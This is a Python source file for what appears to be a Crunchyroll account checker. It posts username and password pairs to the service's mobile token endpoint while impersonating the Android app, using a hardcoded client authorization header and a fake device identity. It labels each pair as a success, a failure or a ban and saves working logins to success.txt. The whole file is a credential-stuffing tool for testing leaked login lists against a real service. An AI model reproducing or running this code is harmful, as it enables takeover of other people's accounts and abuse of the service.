import requests

class Crunchyroll:

    def __init__(self):
     """Create a request session."""

     self.session = requests.Session()
    
    def request(self, user, password):
        """Make the request with the username and password that are passed."""

        url = 'https://beta-api.crunchyroll.com/auth/v1/token'

        headers = {
            'Authorization': 'Basic bC1wbGZ0bmtneWFycGZxaGpoOC06TVFZX3pDeGlOUFk1RUVPX0xQRk9VNFFaZ1ktWVVZRXM=',
            'Etp-Anonymous-Id': '01fb7981-4161-4f0f-a77c-555e80ecbf44',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Crunchyroll/3.47.0 Android/9 okhttp/4.12.0'
        }

        try:
            request = self.session.post(url, data=f'username={user}&password={password}&grant_type=password&scope=offline_access&device_id=d20517c1-38d9-4a8e-8b7e-bd1783fffcdf&device_name=SM-G955N&device_type=samsung%20SM-G955N', headers=headers).text
            
            if('invalid_grant' in request):
                return f"[FAIL] {user}:{password}"
            elif('access_token' in request):
                #Save the logins on success.txt
                with open('success.txt', 'w', encoding='utf-8') as f:
                    f.writelines(f'{user}:{password}\n')
                    
                return f"[SUCCESS] {user}:{password}"
                
            return f"[BAN] {user}:{password}"

        except:
            return f"[ERROR] {user}:{password}"
    
    
